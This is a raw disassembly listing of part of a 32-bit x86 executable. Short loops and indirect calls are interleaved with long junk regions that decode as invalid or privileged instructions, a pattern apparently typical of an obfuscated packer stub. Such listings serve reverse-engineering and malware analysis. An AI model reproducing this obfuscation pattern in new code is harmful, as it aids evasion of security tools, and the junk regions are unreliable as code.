  401914:	jl     0x401992
  401916:	mov    ds:0x197c7c7c,al
  40191b:	outs   dx,DWORD PTR ds:[esi]
  40191c:	mov    esi,gs
  40191e:	mov    bh,0x72
  401920:	jno    0x4018ef
  401922:	sbb    DWORD PTR [esi],esp
  401924:	mov    ebx,0x6243bf77
  401929:	lahf   
  40192a:	sub    ecx,DWORD PTR [esi+0x69]
  40192d:	(bad)  
  40192e:	xchg   edi,eax
  40192f:	add    dl,ah
  401931:	jnp    0x401968
  401933:	or     al,0x99
  401935:	fisttp DWORD PTR [edx-0x17d0acd]
  40193b:	ins    BYTE PTR es:[edi],dx
  40193c:	shl    BYTE PTR [ecx+ebx*2],1
  40193f:	in     eax,0x9f
  401941:	jbe    0x4019c2
  401943:	scas   eax,DWORD PTR es:[edi]
  401944:	dec    ebp
  401945:	adc    al,0xfa
  401947:	dec    esi
  401948:	ds push edx
  40194a:	ret    
  40194b:	cdq    
  40194c:	and    al,0xb8
  40194e:	add    eax,DWORD PTR [edi+0x11178457]
  401954:	inc    ebp
  401955:	mov    bh,0x1f
  401957:	les    esi,FWORD PTR fs:[eax+0x523c0f6c]
  40195e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40195f:	mov    ah,0xd6
  401961:	mov    ah,0x47
  401963:	iret   
  401964:	and    al,BYTE PTR [eax+0x7d059768]
  40196a:	dec    esi
  40196b:	push   ss
  40196c:	out    dx,eax
  40196d:	(bad)  
  40196e:	xchg   edx,eax
  40196f:	dec    esi
  401970:	cmp    bh,0xe
  401973:	or     esi,ebx
  401975:	xor    eax,0x2c502d8a
  40197a:	push   esp
  40197b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40197c:	and    BYTE PTR [ecx-0x73ec1904],al
  401982:	pop    ss
  401983:	jb     0x401910
  401985:	pop    ebx
  401986:	es jbe 0x40194e
  401989:	xchg   DWORD PTR [edi-0x80],esp
  40198c:	clc    
  40198d:	sti    
  40198e:	loopne 0x401915
  401990:	add    bl,BYTE PTR [ecx+edi*4+0x19060e04]
  401997:	fnstenv [ecx+edi*1]
  40199a:	mov    dh,0x74
  40199c:	sbb    DWORD PTR [esi-0x2d],ebp
  40199f:	scas   eax,DWORD PTR es:[edi]
  4019a0:	xlat   BYTE PTR ds:[ebx]
  4019a1:	dec    ecx
  4019a2:	stos   BYTE PTR es:[edi],al
  4019a3:	dec    edi
  4019a4:	mov    edi,DWORD PTR [edi]
  4019a6:	push   ds
  4019a7:	add    dh,BYTE PTR [ecx-0x63]
  4019aa:	jb     0x401977
  4019ac:	jnp    0x401a04
  4019ae:	js     0x401983
  4019b0:	mov    esp,0xcb39178b
  4019b5:	nop
  4019b6:	inc    ebp
  4019b7:	dec    eax
  4019b8:	(bad)  
  4019b9:	adc    BYTE PTR [edi+edi*8-0x21],ch
  4019bd:	retf   
  4019be:	es mov dh,0xa0
  4019c1:	scas   eax,DWORD PTR es:[edi]
  4019c2:	lea    ebp,[eax+0x5b5cdbfb]
  4019c8:	mov    cl,0x7d
  4019ca:	xor    esp,DWORD PTR [edi-0x401f6e92]
  4019d0:	push   DWORD PTR [ebp+0x8]
  4019d3:	call   0x408097
  4019d8:	jmp    0x401aab
  4019dd:	cld    
  4019de:	mov    ecx,eax
  4019e0:	mov    ecx,ebx
  4019e2:	dec    ebx
  4019e3:	mov    edi,0x495a648b
  4019e8:	aad    0x7
  4019ea:	pop    ds
  4019eb:	imul   esp,esp,0xffffffac
  4019ee:	jae    0x401a6c
  4019f0:	jl     0x401994
  4019f2:	jl     0x401a70
  4019f4:	jl     0x4019df
  4019f6:	xor    dh,BYTE PTR [edx+ebx*4-0x603c4111]
  4019fd:	cdq    
  4019fe:	cmp    eax,0x4d4afd32
  401a03:	(bad)  
  401a05:	add    bl,BYTE PTR [esi+ecx*4+0x79]
  401a09:	lahf   
  401a0a:	adc    eax,DWORD PTR [eax-0x6c]
  401a0d:	jno    0x40199b
  401a0f:	mov    eax,0xd9417448
  401a14:	mov    ah,BYTE PTR [ecx]
  401a16:	iret   
  401a17:	fmul   QWORD PTR [ebp+0x4c4088e6]
  401a1d:	out    0xb5,eax
  401a1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a20:	push   ss
  401a21:	(bad)  
  401a22:	push   esp
  401a23:	inc    ebx
  401a24:	sub    eax,0x8b7c15bf
  401a29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a2a:	sub    ch,BYTE PTR [ecx+0x33]
  401a2d:	data16 jge 0x401a32
  401a30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a31:	jp     0x4019be
  401a33:	dec    ebx
  401a34:	sub    DWORD PTR [edi],esp
  401a36:	sar    BYTE PTR [eax-0x3b7b18b0],0xc0
  401a3d:	popf   
  401a3e:	pop    edi
  401a3f:	pusha  
  401a40:	xchg   edi,eax
  401a41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a43:	mov    eax,0x8c586073
  401a48:	mov    ah,0x33
  401a4a:	sub    al,0x25
  401a4c:	mov    ecx,0x2023cb46
  401a51:	cmp    bh,BYTE PTR ds:[ebx+0x3e05cb8b]
  401a58:	je     0x401a23
  401a5a:	aaa    
  401a5b:	outs   dx,BYTE PTR ds:[esi]
  401a5c:	jno    0x401a26
  401a5e:	pop    esi
  401a5f:	ret    0xd65f
  401a62:	inc    eax
  401a63:	in     eax,dx
  401a64:	cs push ds
  401a66:	in     al,dx
  401a67:	sub    BYTE PTR [ebx+eax*1+0x4fe3d912],bl
  401a6e:	fwait
  401a6f:	or     DWORD PTR [ecx-0x1161f0d3],ecx
  401a75:	daa    
  401a76:	and    eax,0xd35b78ca
  401a7b:	ins    BYTE PTR es:[edi],dx
  401a7c:	adc    eax,0x554a9ca7
  401a81:	inc    dh
  401a83:	adc    DWORD PTR [ecx+0x33b2df3f],edi
  401a89:	in     eax,dx
  401a8a:	push   0x8c1c253a
  401a8f:	xchg   edx,eax
  401a90:	pop    eax
  401a91:	pop    esi
  401a92:	xchg   esi,eax
  401a93:	pop    ecx
  401a94:	hlt    
  401a95:	outs   dx,BYTE PTR ds:[esi]
  401a96:	scas   eax,DWORD PTR es:[edi]
  401a97:	mov    bh,BYTE PTR [edx-0x3d]
  401a9a:	in     eax,0xbe
  401a9c:	pop    ss
  401a9d:	xor    al,0x31
  401a9f:	(bad)  
  401aa0:	push   ecx
  401aa1:	sub    BYTE PTR [ecx-0x64],ch
  401aa4:	xor    bh,dh
  401aa6:	pop    ss
  401aa7:	repz int3 
  401aa9:	sbb    al,0x2c
  401aab:	mov    DWORD PTR [ebp-0x14],eax
  401aae:	mov    eax,DWORD PTR [ebp-0x4]
  401ab1:	add    DWORD PTR ds:0x44b6cc,ecx
  401ab7:	mov    ecx,DWORD PTR [ebp-0x14]
  401aba:	xor    eax,esi
  401abc:	add    eax,ebx
  401abe:	mov    DWORD PTR ds:0x42484c,0x6998
  401ac8:	cmp    ecx,eax
  401aca:	mov    DWORD PTR ds:0x44b6d4,0x4e4a
  401ad4:	je     0x4021a9
  401ada:	mov    eax,DWORD PTR [ebp-0x14]
  401add:	mov    eax,DWORD PTR [eax+0x18]
  401ae0:	and    DWORD PTR ds:0x448994,0x0
  401aea:	xor    ecx,ecx
  401aec:	add    ecx,DWORD PTR ds:0x448994
  401af2:	inc    ecx
  401af3:	mov    DWORD PTR ds:0x448994,ecx
  401af9:	cmp    DWORD PTR ds:0x448994,0x7
  401b00:	jne    0x401b19
  401b06:	push   0x41098d
  401b0b:	push   0x41075f
  401b10:	push   DWORD PTR [ebp-0x1c]
  401b13:	call   DWORD PTR ds:0x443344
  401b19:	cmp    DWORD PTR ds:0x448994,0x6
  401b20:	jne    0x401b35
  401b26:	xor    ecx,ecx
  401b28:	xor    ecx,DWORD PTR ds:0x448994
  401b2e:	inc    ecx
  401b2f:	mov    DWORD PTR ds:0x448994,ecx
  401b35:	cmp    DWORD PTR ds:0x448994,0x12
  401b3c:	jb     0x401aea
  401b42:	sub    DWORD PTR ds:0x424850,0x3b9b
  401b4c:	jmp    0x401c1f
  401b51:	inc    ecx
  401b52:	adc    eax,0x9d621a92
  401b57:	jns    0x401bc6
  401b59:	retf   
  401b5a:	push   cs
  401b5b:	ins    BYTE PTR es:[edi],dx
  401b5c:	jno    0x401bb9
  401b5e:	xor    al,0x5c
  401b60:	xor    dl,dl
  401b62:	jb     0x401be0
  401b64:	jl     0x401b08
  401b66:	jl     0x401be4
  401b68:	jl     0x401b85
  401b6a:	repz add DWORD PTR ds:[edx-0x38386b67],esi
  401b72:	pop    es
  401b73:	sbb    eax,0xbb63dde0
  401b78:	add    DWORD PTR [eax],esp
  401b7a:	scas   eax,DWORD PTR es:[edi]
  401b7b:	(bad)  
  401b7c:	ss ins DWORD PTR es:[edi],dx
  401b7e:	cld    
  401b7f:	mov    al,ds:0x9a9451a1
  401b84:	mov    dh,0xf8
  401b86:	mov    bh,cl
  401b88:	mov    esi,0x4d6efe56
  401b8d:	inc    esp
  401b8e:	outs   dx,BYTE PTR ds:[esi]
  401b8f:	sbb    edi,esi
  401b91:	mov    DWORD PTR [ecx],0xd97b6f19
  401b97:	adc    ecx,DWORD PTR [ecx]
  401b99:	fnstsw WORD PTR ds:0xf8497ec9
  401b9f:	sbb    bl,BYTE PTR [ebx]
  401ba1:	jecxz  0x401b7e
  401ba3:	xlat   BYTE PTR ds:[ebx]
  401ba4:	mov    al,ds:0xfeb29d53
  401ba9:	pop    ds
  401baa:	test   eax,0xcbb738e4
  401baf:	dec    esp
  401bb0:	push   DWORD PTR [ebp+0x36]
  401bb3:	fcos   
  401bb5:	es and al,0xca
  401bb8:	sub    eax,0x1ab1f51e
  401bbd:	adc    BYTE PTR [eax],ch
  401bbf:	push   eax
  401bc0:	push   ecx
  401bc1:	loopne 0x401b7c
  401bc3:	inc    esp
  401bc4:	inc    esi
  401bc5:	cdq    
  401bc6:	sti    
  401bc7:	sbb    al,0x3
  401bc9:	scas   al,BYTE PTR es:[edi]
  401bca:	cdq    
  401bcb:	mov    ebp,0xfed5fceb
  401bd0:	pop    edi
  401bd1:	call   0x551c:0x4ee7
  401bd7:	mov    bh,0x5a
  401bd9:	fwait
  401bda:	cdq    
  401bdb:	inc    BYTE PTR [ebp+ebp*2+0x2d]
  401bdf:	lahf   
  401be0:	les    edi,FWORD PTR ds:0x93cb94f4
  401be6:	sub    ebp,DWORD PTR [ecx]
  401be8:	stos   DWORD PTR es:[edi],eax
  401be9:	inc    edi
  401bea:	xor    BYTE PTR [ebp+ebx*8+0x13],bh
  401bee:	stos   BYTE PTR es:[edi],al
  401bef:	ins    DWORD PTR es:[edi],dx
  401bf0:	or     al,0x72
  401bf2:	sbb    DWORD PTR ds:0xc1f59413,ebp
  401bf8:	inc    ebp
  401bf9:	inc    ecx
  401bfa:	jge    0x401bf2
  401bfc:	fdivr  QWORD PTR [ecx+ebx*2]
  401bff:	inc    ebp
  401c00:	or     eax,0xc9a7efa0
  401c05:	mov    ebp,0x6562debb
  401c0a:	in     eax,0xbe
  401c0c:	sbb    al,0xc1
  401c0e:	xor    eax,0xdc5db08
  401c13:	ror    WORD PTR [ebx+0x12d73e65],1
  401c1a:	out    0xfa,al
  401c1c:	xchg   esi,eax
  401c1d:	aad    0x68
  401c1f:	mov    DWORD PTR [ebp-0x20],eax
  401c22:	and    ecx,0x68b3
  401c28:	mov    eax,DWORD PTR [ebp-0x14]
  401c2b:	mov    ecx,DWORD PTR [ebp+0x8]
  401c2e:	and    DWORD PTR ds:0x44899c,0x44b6e0
  401c38:	add    ecx,DWORD PTR [eax+0x20]
  401c3b:	movzx  eax,BYTE PTR ds:0x44e424
  401c42:	and    eax,DWORD PTR ds:0x44b6e4
  401c48:	mov    ds:0x44e424,eax
  401c4d:	mov    DWORD PTR [ebp-0x28],ecx
  401c50:	sub    DWORD PTR ds:0x424858,ecx
  401c56:	mov    eax,DWORD PTR [ebp-0x14]
  401c59:	and    DWORD PTR ds:0x41074b,0x0
  401c63:	jmp    0x401c75
  401c68:	mov    ecx,DWORD PTR ds:0x41074b
  401c6e:	inc    ecx
  401c6f:	mov    DWORD PTR ds:0x41074b,ecx
  401c75:	cmp    DWORD PTR ds:0x41074b,0x1d
  401c7c:	jae    0x401cc9
  401c82:	cmp    DWORD PTR ds:0x41074b,0x9
  401c89:	jne    0x401caa
  401c8f:	push   DWORD PTR [ebp-0x20]
  401c92:	push   0x8068
  401c97:	push   0x67b9
  401c9c:	push   0x4109ab
  401ca1:	push   DWORD PTR [ebp-0x24]
  401ca4:	call   DWORD PTR ds:0x4430c8
  401caa:	cmp    DWORD PTR ds:0x41074b,0x8
  401cb1:	jne    0x401cc4
  401cb7:	mov    ecx,DWORD PTR ds:0x41074b
  401cbd:	inc    ecx
  401cbe:	mov    DWORD PTR ds:0x41074b,ecx
  401cc4:	jmp    0x401c68
  401cc9:	mov    ecx,DWORD PTR [ebp+0x8]
  401ccc:	not    DWORD PTR ds:0x44898c
  401cd2:	add    ecx,DWORD PTR [eax+0x24]
  401cd5:	xor    DWORD PTR ds:0x44b6e0,0x6435
  401cdf:	mov    DWORD PTR [ebp-0x2c],ecx
  401ce2:	jmp    0x401db5
  401ce7:	cmp    edi,DWORD PTR [ebx]
  401ce9:	mov    eax,0xbd95b815
  401cee:	cmp    eax,0x3403dcf7
  401cf3:	stc    
  401cf4:	or     eax,0x75189c74
  401cf9:	jl     0x401d77
  401cfb:	mov    ds:0x2e7c7c7c,al
  401d00:	mov    al,0xfb
  401d02:	xchg   esi,eax
  401d03:	retf   
  401d04:	rcl    BYTE PTR [eax],cl
  401d06:	inc    eax
  401d07:	test   DWORD PTR [ebp-0x79],eax
  401d0a:	addps  xmm2,XMMWORD PTR [ecx]
  401d0d:	mov    bh,ah
  401d0f:	fsubr  QWORD PTR [ecx+0x31615bc5]
  401d15:	hlt    
  401d16:	sbb    ch,BYTE PTR ds:[edx]
  401d19:	stc    
  401d1a:	add    eax,0x43410320
  401d1f:	xor    al,0x47
  401d21:	nop
  401d22:	push   ebx
  401d23:	xor    DWORD PTR [eax+0x5b79a834],eax
  401d29:	sbb    al,0x73
  401d2b:	xchg   ebp,eax
  401d2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d2d:	imul   esi,DWORD PTR [eax-0x48],0x1c
  401d31:	mov    edi,ds
  401d33:	push   ecx
  401d34:	outs   dx,DWORD PTR ds:[esi]
  401d35:	push   0xffffffcb
  401d37:	push   0xffffffae
  401d39:	jl     0x401d4a
  401d3b:	test   BYTE PTR [esi+0x7252dafb],al
  401d41:	leave  
  401d42:	push   es
  401d43:	shl    DWORD PTR [ebp+0x1e99731b],1
  401d49:	ds cmp al,al
  401d4c:	mov    ds:0x2f6be46a,al
  401d51:	inc    esi
  401d52:	pop    ecx
  401d53:	test   ecx,0x20e073a3
  401d59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d5a:	cmp    al,0xc6
  401d5c:	mov    ds:0x2e3e4c3e,al
  401d61:	cmp    DWORD PTR [edx+0x4f],esi
  401d64:	sahf   
  401d65:	mov    dl,0x3f
  401d67:	mov    ch,0x11
  401d69:	adc    eax,0x5e10da82
  401d6e:	test   dl,dl
  401d70:	jnp    0x401d05
  401d72:	jne    0x401d99
  401d74:	enter  0x7771,0xf7
  401d78:	loopne 0x401cfb
  401d7a:	fcom   QWORD PTR ds:0x9b083cfa
  401d80:	arpl   WORD PTR [edx+0x2778d2e0],bp
  401d86:	std    
  401d87:	xor    DWORD PTR [edi+ecx*1+0x49],esp
  401d8b:	hlt    
  401d8c:	call   0x983e:0x5cfcf742
  401d93:	jge    0x401dc3
  401d95:	xor    BYTE PTR [eax+0x27],dl
  401d98:	ja     0x401d9e
  401d9a:	mov    ecx,0xfee5c30c
  401d9f:	ss ins BYTE PTR es:[edi],dx
  401da1:	push   edi
  401da2:	fwait
  401da3:	popf   
  401da4:	aad    0xff
  401da6:	lock in eax,dx
  401da8:	pop    esp
  401da9:	out    0x3a,al
  401dab:	mov    BYTE PTR [edx-0x723d4aae],bl
  401db1:	xlat   BYTE PTR ds:[ebx]
  401db2:	std    
  401db3:	cld    
  401db4:	retf   
  401db5:	mov    eax,DWORD PTR [ebp-0x14]
  401db8:	mov    DWORD PTR ds:0x41075b,0x19
  401dc2:	cmp    DWORD PTR ds:0x41075b,0x0
  401dc9:	je     0x401e11
  401dcf:	cmp    DWORD PTR ds:0x41075b,0xb
  401dd6:	jne    0x401de5
  401ddc:	push   DWORD PTR [ebp-0x24]
  401ddf:	call   DWORD PTR ds:0x4430cc
  401de5:	cmp    DWORD PTR ds:0x41075b,0xc
  401dec:	jne    0x401dff
  401df2:	mov    ecx,DWORD PTR ds:0x41075b
  401df8:	dec    ecx
  401df9:	mov    DWORD PTR ds:0x41075b,ecx
  401dff:	mov    ecx,DWORD PTR ds:0x41075b
  401e05:	dec    ecx
  401e06:	mov    DWORD PTR ds:0x41075b,ecx
  401e0c:	jmp    0x401dc2
  401e11:	mov    ecx,DWORD PTR [ebp+0x8]
  401e14:	add    ecx,DWORD PTR [eax+0x1c]
  401e17:	xor    esi,esi
  401e19:	mov    DWORD PTR [ebp-0x14],ecx
  401e1c:	jmp    0x401eef
  401e21:	xor    al,0x72
  401e23:	mov    ds:0x46657dd5,eax
  401e28:	sub    eax,0xe5b1e0bc
  401e2d:	shl    DWORD PTR [ecx+0x754e5ecf],0x7c
  401e34:	jl     0x401dd8
  401e36:	jl     0x401eb4
  401e38:	jl     0x401e1d
  401e3a:	jmp    0xa40e7113
  401e3f:	loopne 0x401de4
  401e41:	push   edi
  401e42:	in     eax,0xa8
  401e44:	mov    edi,0x14be91bd
  401e49:	mov    ds:0xd2e00aaf,eax
  401e4e:	fild   QWORD PTR [ecx+0x52]
  401e51:	inc    edx
  401e52:	add    eax,0x712ddbbf
  401e57:	outs   dx,BYTE PTR ds:[esi]
  401e58:	mov    ds,WORD PTR [esi-0x2422f021]
  401e5e:	cld    
  401e5f:	inc    ebx
  401e60:	push   esi
  401e61:	gs jo  0x401e87
  401e64:	int3   
  401e65:	jo     0x401e2a
  401e67:	mov    al,0x88
  401e69:	gs int3 
  401e6b:	mov    dh,BYTE PTR [edi*1+0x74463c52]
  401e72:	sub    eax,0xb9e601bb
  401e77:	cs jo  0x401ed3
  401e7a:	pop    edx
  401e7b:	stos   BYTE PTR es:[edi],al
  401e7c:	adc    BYTE PTR [edx],cl
  401e7e:	mov    ecx,0xfc04cbf5
  401e83:	adc    ah,BYTE PTR [edi-0x7781278f]
  401e89:	xor    dl,al
  401e8b:	push   esp
  401e8c:	mov    bh,0x2e
  401e8e:	jl     0x401f0c
  401e90:	mov    eax,ds:0x92744e21
  401e95:	mov    ecx,0x4439eba6
  401e9a:	cmp    al,0xc4
  401e9c:	fbld   TBYTE PTR [edi]
  401e9e:	imul   eax,DWORD PTR [eax-0x45],0x78213f2f
  401ea5:	push   ecx
  401ea6:	ror    DWORD PTR [ecx],1
  401ea8:	pop    edx
  401ea9:	out    dx,eax
  401eaa:	imul   edi,DWORD PTR [ecx-0x42ea6795],0xffffff8e
  401eb1:	jno    0x401ece
  401eb3:	loop   0x401e8e
  401eb5:	cdq    
  401eb6:	inc    ebp
  401eb7:	ds push ebx
  401eb9:	sti    
  401eba:	jle    0x401eb3
  401ebc:	sbb    al,0x89
  401ebe:	pop    ds
  401ebf:	jle    0x401f08
  401ec1:	pop    ebx
  401ec2:	pop    esi
  401ec3:	jb     0x401ed7
  401ec5:	fs pop eax
  401ec7:	and    eax,DWORD PTR [ebp-0x42]
  401eca:	lahf   
  401ecb:	xor    ebp,DWORD PTR [ebp-0x6d]
  401ece:	in     eax,0x4a
  401ed0:	in     al,0x55
  401ed2:	sbb    BYTE PTR [eax-0x707d5ba2],0xf1
  401ed9:	mov    edi,DWORD PTR ds:0xa330
  401ede:	rcl    BYTE PTR [edx-0x75],0xc8
  401ee2:	pushf  
  401ee3:	pop    eax
  401ee4:	mov    ebx,0xb5357018
  401ee9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401eea:	stos   BYTE PTR es:[di],al
  401eec:	outs   dx,BYTE PTR ds:[esi]
  401eed:	inc    edi
  401eee:	pop    ecx
  401eef:	mov    eax,DWORD PTR [ebp-0x28]
  401ef2:	mov    ecx,DWORD PTR [ebp+0x8]
  401ef5:	add    ecx,DWORD PTR [eax+edi*4]
  401ef8:	lea    eax,[ebp-0x8]
  401efb:	mov    DWORD PTR [ebp-0x30],ecx
  401efe:	push   eax
  401eff:	push   DWORD PTR [ebp-0x30]
  401f02:	jmp    0x401fd5
  401f07:	pop    esp
  401f08:	jecxz  0x401f20
  401f0a:	xchg   ebp,eax
  401f0b:	mov    ebp,0x1ee56b7d
  401f10:	jb     0x401ec2
  401f12:	daa    
  401f13:	lock jnp 0x401eeb
  401f16:	(bad)  
  401f18:	je     0x401f96
  401f1a:	jl     0x401ebe
  401f1c:	jl     0x401f9a
  401f1e:	jl     0x401f61
  401f20:	rcl    DWORD PTR [eax],0xd0
  401f23:	cmc    
  401f24:	sub    ebp,DWORD PTR [esi+0x7b56be92]
  401f2a:	inc    esp
  401f2b:	jmp    0x97f1:0xa06e0701
  401f32:	shl    BYTE PTR [ebx-0x20dcb39d],1
  401f38:	aam    0xf1
  401f3a:	sti    
  401f3b:	rcl    DWORD PTR [ecx-0x768de9ec],cl
  401f41:	fwait
  401f42:	pop    esi
  401f43:	lea    eax,[esi-0x7]
  401f46:	dec    cl
  401f48:	in     al,dx
  401f49:	xor    edi,edi
  401f4b:	xor    BYTE PTR [ebp-0x15],ah
  401f4e:	ins    DWORD PTR es:[edi],dx
  401f4f:	je     0x401ee8
  401f51:	mov    dh,0x31
  401f53:	ins    DWORD PTR es:[edi],dx
  401f54:	mov    DWORD PTR [eax-0x4e43c3c2],ebp
  401f5a:	test   BYTE PTR [ebx],ah
  401f5c:	mov    al,ds:0x5bfa07d6
  401f61:	daa    
  401f62:	jge    0x401eea
  401f64:	sbb    cl,BYTE PTR ds:0x4694259e
  401f6a:	dec    eax
  401f6b:	mov    ch,0xa0
  401f6d:	fdiv   DWORD PTR [eax-0x7]
  401f70:	mov    ds:0x9820c1c7,eax
  401f75:	ss std 
  401f77:	xor    eax,0x2f0cf101
  401f7c:	(bad)  
  401f7d:	pop    ebp
  401f7e:	out    dx,eax
  401f7f:	push   eax
  401f80:	(bad)  
  401f81:	jmp    0x401f92
  401f83:	jp     0x401f2f
  401f85:	xor    dl,bl
  401f87:	imul   esi,esp,0x5f885801
  401f8d:	clc    
  401f8e:	adc    DWORD PTR [ebx-0x24],0x12
  401f92:	inc    ebp
  401f93:	jne    0x401fe4
  401f95:	fadd   st(3),st
  401f97:	mov    esp,0xc2ad7e4a
  401f9c:	mov    ds,esp
  401f9e:	outs   dx,BYTE PTR ds:[esi]
  401f9f:	add    bl,bh
  401fa1:	imul   edi,DWORD PTR [eax+0x58868347],0xffffffa2
  401fa8:	add    BYTE PTR [eax-0x38],dh
  401fab:	pop    edi
  401fac:	retf   
  401fad:	out    dx,eax
  401fae:	add    eax,0xbc7fb1d5
  401fb3:	jmp    0x401f69
  401fb5:	lods   eax,DWORD PTR ds:[esi]
  401fb6:	js     0x401fcc
  401fb8:	inc    edi
  401fb9:	div    DWORD PTR [bp+di-0x3669]
  401fbe:	in     al,dx
  401fbf:	jmp    0x6e3a:0x23fbc27e
  401fc6:	inc    edi
  401fc7:	dec    ebx
  401fc8:	add    BYTE PTR [ecx+0x3b],dh
  401fcb:	push   ecx
  401fcc:	push   ecx
  401fcd:	mov    eax,0xc787da26
  401fd2:	sub    edx,DWORD PTR [eax+0x14]
  401fd5:	push   DWORD PTR [ebp+0xc]
  401fd8:	jmp    0x4020ab
  401fdd:	or     dl,BYTE PTR [eax+ebp*1]
  401fe0:	mov    dl,0x2a
  401fe2:	mov    dl,0x6a
  401fe4:	push   esp
  401fe5:	int3   
  401fe6:	xchg   ebp,eax
  401fe7:	xchg   esp,eax
  401fe8:	int    0x40
  401fea:	inc    esi
  401feb:	fadd   DWORD PTR [eax]
  401fed:	cmp    dh,BYTE PTR [edi+0x7c]
  401ff0:	jl     0x401f94
  401ff2:	jl     0x402070
  401ff4:	jl     0x401fb2
  401ff6:	pop    ecx
  401ff7:	repz xchg ebx,eax
  401ff9:	mov    DWORD PTR [ebp-0x2f],esi
  401ffc:	mov    bh,0xe8
  401ffe:	out    0x55,al
  402000:	lock xor BYTE PTR [ebp+0x55],ch
  402004:	dec    esi
  402005:	sti    
  402006:	jp     0x40204c
  402008:	xchg   ebp,eax
  402009:	ins    DWORD PTR es:[edi],dx
  40200a:	or     DWORD PTR [eax+0x65d211f8],ebp
  402010:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402011:	(bad)  
  402012:	pop    edi
  402013:	adc    esp,DWORD PTR [esi-0xf]
  402016:	jb     0x402013
  402018:	ins    BYTE PTR es:[edi],dx
  402019:	icebp  
  40201a:	mov    ?,WORD PTR [esp+eiz*2]
  40201d:	sub    al,0x33
  40201f:	aam    0xa0
  402021:	mov    dh,0x93
  402023:	sbb    BYTE PTR [edx],ch
  402025:	xor    DWORD PTR [edi*2-0x136c48c2],0xda7e051c
  402030:	fsub   DWORD PTR [esi+0x42]
  402033:	test   BYTE PTR [edx],dl
  402035:	pop    edi
  402036:	add    BYTE PTR [ebp+0x2e553e40],0x9
  40203d:	add    BYTE PTR [ebp+ecx*4-0x60],bh
  402041:	punpckhdq mm1,QWORD PTR [ebx+0x63]
  402045:	fisub  DWORD PTR [ecx]
  402047:	and    bh,cl
  402049:	popa   
  40204a:	xchg   ecx,eax
  40204b:	jl     0x402074
  40204d:	popf   
  40204e:	nop
  40204f:	pop    ebx
  402050:	mov    dh,bl
  402052:	jmp    0x16b50b52
  402057:	(bad)
  40205b:	sbb    BYTE PTR [ebx],dl
  40205d:	mov    ecx,0x4442817
  402062:	mov    bh,0xf7
  402064:	lahf   
  402065:	loope  0x402046
  402067:	leave  
  402068:	daa    
  402069:	sbb    bh,dl
  40206b:	loope  0x402006
  40206d:	test   DWORD PTR [ebp+0x717c3ca5],0x3ddf414d
  402077:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402078:	mov    esp,0x7e652675
  40207d:	jecxz  0x4020ad
  40207f:	inc    esp
  402080:	adc    BYTE PTR ds:0xf0f10196,cl
  402086:	add    BYTE PTR [eax+0x29],bl
  402089:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40208a:	ja     0x40200c
  40208c:	mov    esi,0x5070dcba
  402091:	sbb    bh,BYTE PTR [edx+0x2e47fbeb]
  402097:	rcr    BYTE PTR [edx-0x7d],1
  40209a:	xchg   al,dl
  40209c:	sub    al,0xf8
  40209f:	jg     0x40208a
  4020a1:	nop
  4020a2:	inc    ecx
  4020a3:	inc    esp
  4020a4:	mov    ecx,DWORD PTR [esi]
  4020a6:	mov    ds:0x1a90d625,al
  4020ab:	call   0x409298
  4020b0:	mov    eax,DWORD PTR [ebp-0x4]
  4020b3:	mov    ecx,DWORD PTR [ebp-0x8]
  4020b6:	xor    eax,0x7510857
  4020bb:	add    eax,ebx
  4020bd:	cmp    ecx,eax
  4020bf:	jne    0x4021b5
  4020c5:	jmp    0x402198
  4020ca:	dec    esp
  4020cb:	xchg   esp,eax
  4020cc:	pop    edi
  4020cd:	add    BYTE PTR [edi-0x25],ah
  4020d0:	arpl   WORD PTR [eax-0x10],bp
  4020d3:	adc    ebx,DWORD PTR [eax-0x2300b0b8]
  4020d9:	pop    esp
  4020da:	pusha  
  4020db:	ja     0x402159
  4020dd:	jl     0x402081
  4020df:	jl     0x40215d
  4020e1:	jl     0x402133
  4020e3:	rcr    DWORD PTR ds:0x2c361200,0x6f
  4020ea:	xchg   ebp,eax
  4020eb:	mov    bh,dh
  4020ed:	cmp    ecx,eax
  4020ef:	into   
  4020f0:	or     esi,0x15
  4020f3:	inc    ecx
  4020f4:	and    edx,ecx
  4020f6:	sbb    BYTE PTR [edx-0x50],ah
  4020f9:	xchg   ecx,eax
  4020fa:	push   eax
  4020fb:	pop    ebx
  4020fd:	cdq    
  4020fe:	inc    edx
  4020ff:	in     al,0xab
  402101:	enter  0x623c,0xae
  402105:	enter  0x7ce2,0x70
  402109:	or     ah,BYTE PTR [edi+ecx*1]
  40210c:	retf   
  40210d:	cld    
  40210e:	sbb    DWORD PTR [edi-0x4b],edi
  402111:	and    esi,DWORD PTR [ebp+0x5b001a44]
  402117:	jae    0x40215e
  402119:	sub    edx,DWORD PTR [edx-0x1e]
  40211c:	scas   al,BYTE PTR es:[edi]
  40211d:	and    DWORD PTR [ebx],edx
  40211f:	jp     0x40211c
  402121:	mov    esi,0x95698b4c
  402126:	xchg   esp,eax
  402127:	jbe    0x4020c7
  402129:	xchg   esi,eax
  40212a:	fcmovnbe st,st(4)
  40212c:	xchg   DWORD PTR [ebx-0x68],ecx
  40212f:	aad    0x26
  402131:	scas   eax,DWORD PTR es:[edi]
  402132:	push   ebp
  402133:	pop    esi
  402134:	jns    0x40218d
  402136:	inc    ebp
  402137:	std    
  402138:	xchg   esp,eax
  402139:	adc    DWORD PTR [ebx],esp
  40213b:	iret   
  40213c:	and    al,0x85
  40213e:	test   al,0x3b
  402140:	ss cmp eax,0x4dbecb05
  402146:	std    
  402147:	jbe    0x40210d
  402149:	push   ebx
  40214a:	mov    bl,0xcc
  40214c:	or     BYTE PTR [ecx],ch
  40214e:	inc    eax
  40214f:	mov    eax,0x43ad58ff
  402154:	xchg   ecx,eax
  402155:	jno    0x402159
  402157:	hlt    
  402158:	rol    al,cl
  40215a:	std    
